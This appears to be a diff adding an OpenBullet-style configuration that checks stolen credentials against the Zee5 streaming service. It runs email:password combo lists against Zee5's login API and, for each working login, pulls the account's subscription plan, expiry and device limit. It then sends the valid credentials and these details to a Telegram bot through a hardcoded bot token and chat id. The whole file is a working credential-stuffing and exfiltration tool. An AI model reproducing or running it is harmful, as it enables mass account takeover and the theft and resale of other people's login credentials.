@@ -1,0 +1,115 @@
+[SETTINGS]
+{
+  "Name": "Zee5 V2 blackwiki",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-08T08:18:41.7125974+00:00",
+  "AdditionalInfo": "",
+  "Author": "blackwiki",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://whapi.zee5.com/v1/user/loginemail_v2.php" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"aid\":\"91955485578\",\"lotame_cookie_id\":\"\",\"guest_token\":\"35565017eec4900f32b0c9258050bf53\",\"platform\":\"web\",\"version\":\"2.49.54\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://www.zee5.com" 
+  HEADER "referer: https://www.zee5.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "{\"access_token\":\"" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\",\"" -> VAR "tk" 
+
+REQUEST GET "https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=IN&include_all=true" 
+  
+  HEADER "Authorization: bearer <tk>" 
+  HEADER "Referer: https://www.zee5.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "state\":\"activated" 
+
+PARSE "<SOURCE>" LR "\",\"title\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "\",\"recurring_enabled\":" ",\"" CreateEmpty=FALSE -> CAP "Auto Renewal" 
+
+PARSE "<SOURCE>" LR "\",\"number_of_supported_devices\":" ",\"" CreateEmpty=FALSE -> CAP "Device Limit" 
+
+PARSE "<SOURCE>" LR "\",\"subscription_end\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry>" -> VAR "exp" 
+
+FUNCTION CurrentUnixTime -> VAR "cur" 
+
+FUNCTION Compute "((<exp>-<cur>)/86400)" -> VAR "d1" 
+
+FUNCTION Round "<d1>" -> CAP "day" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<day>" GreaterThan "0" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<day>" LessThan "0" 
+
+FUNCTION Constant "<USER>:<PASS> ||Expiry = <Expiry> || Plan = <Plan> ZEE5 | renew = <Auto Renewal> | limit = <Device Limit> || Day = <day> day" -> VAR "TEXT" 
+
+FUNCTION Constant "1874458126:AAHL5YAtOKrJ4GbFhgUWzLg66iHNy0wncwU" -> VAR "BOT_TOKEN" 
+
+REQUEST GET "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage?chat_id=-1001428335762&text=<TEXT>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
